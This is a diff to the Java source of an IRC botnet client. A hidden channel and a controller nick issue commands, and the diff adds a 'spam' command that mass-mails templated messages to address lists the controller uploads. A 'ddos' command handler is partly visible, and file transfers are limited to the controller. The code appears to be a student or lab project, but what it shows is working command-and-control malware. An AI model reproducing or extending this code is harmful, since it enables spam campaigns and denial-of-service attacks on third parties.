@@ -17,6 +17,9 @@ public class BotnetClient extends PircBot {
 	private static final String CHANNEL = "#hacktastic";
 	private static final String NAME = "bot";
 	private static final String CC = "RandR";
+	private static final String TEMPLATE = "template.txt";
+	private static final String EMAILS = "emails.txt";
+	private static final String RANDOM_EMAILS = "random_emails.txt";
 	private static final int PORT = 6667;
 	private String uuid;
 	private String id;
@@ -35,8 +38,7 @@ public class BotnetClient extends PircBot {
 			setName(id);
 			setMessageDelay(0);
 			connect(SERVER, PORT);
-			joinChannel(CHANNEL);
-			setMode(CHANNEL, "+s");
+			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 		} catch (NickAlreadyInUseException e) {
 			uuid = UUID.randomUUID().toString();
 			id = NAME + "_" + uuid;
@@ -44,12 +46,61 @@ public class BotnetClient extends PircBot {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		sendEmail("roy@cs.washington.edu", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
+	}
+	
+	protected void onConnect() {
+		joinChannel(CHANNEL);
+		setMode(CHANNEL, "+s");
+	}
+	
+	private String[] getEmails(String fileName) {
+		try {
+			List<String> list = new ArrayList<String>();
+			Scanner in = new Scanner(new File(fileName));
+			while (in.hasNextLine()) {
+				String line = in.nextLine();
+				if (!line.isEmpty()) {
+					list.add(line.trim());
+				}
+			}
+			return (String[])list.toArray();
+		} catch (Exception e) {
+			System.out.println(e.getMessage());
+		}
+		return null;
 	}
 		
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
 		if (message.toLowerCase().startsWith("spam")) {
-			System.out.println("Sending Spam");
+			String[] parts = message.split(" ");
+			if (parts.length < 8) {
+				System.out.println("bad spam message");
+			} else {
+				String x = parts[1];
+				String y = parts[2];
+				String z = parts[3];
+				String from = parts[4];
+				String subject = parts[5];
+				String[] to;
+				if (parts[6].toLowerCase().equals("random")) {
+					to = getEmails(RANDOM_EMAILS);
+				} else if (parts[6].toLowerCase().equals("all")) {
+					to = getEmails(EMAILS);
+				} else {
+					to = Arrays.copyOfRange(parts, 6, parts.length);
+				}
+				String body = "";
+				try {
+					Scanner in = new Scanner(new File(TEMPLATE));
+					while (in.hasNextLine()) {
+						body += in.nextLine() + "\r\n";
+					}
+				} catch (Exception e) {
+					System.out.println("There were problems reading " + TEMPLATE);
+				}
+				body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
+				sendEmail(from, to, subject, body);
+			}
 		} else if (message.toLowerCase().startsWith("ddos")) {
 			System.out.println(sender + ": " + message);
 			String[] parts = message.split(" ");
@@ -78,9 +129,17 @@ public class BotnetClient extends PircBot {
 	}
 	
 	protected void onIncomingFileTransfer(DccFileTransfer transfer) {
-		String fileName = transfer.getFile().getName();
-		System.out.println("Receiving file: " + fileName);
-		transfer.receive(new File(fileName), false);
+		if (transfer.getNick().equals(CC)) {
+			String fileName = transfer.getFile().getName();
+			System.out.println("Receiving file: " + fileName);
+			if (fileName.equals(TEMPLATE) || fileName.equals(EMAILS)) {
+				transfer.receive(new File(fileName), false);
+			} else {
+				this.sendMessage(CC, "Expecting file of name " + TEMPLATE + " or " + EMAILS);
+			}
+		} else {
+			System.out.println(transfer.getNick() + "<" + transfer.getNumericalAddress() + "> tried to send me " + transfer.getFile().getAbsolutePath());
+		}
 	}
 	
 	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
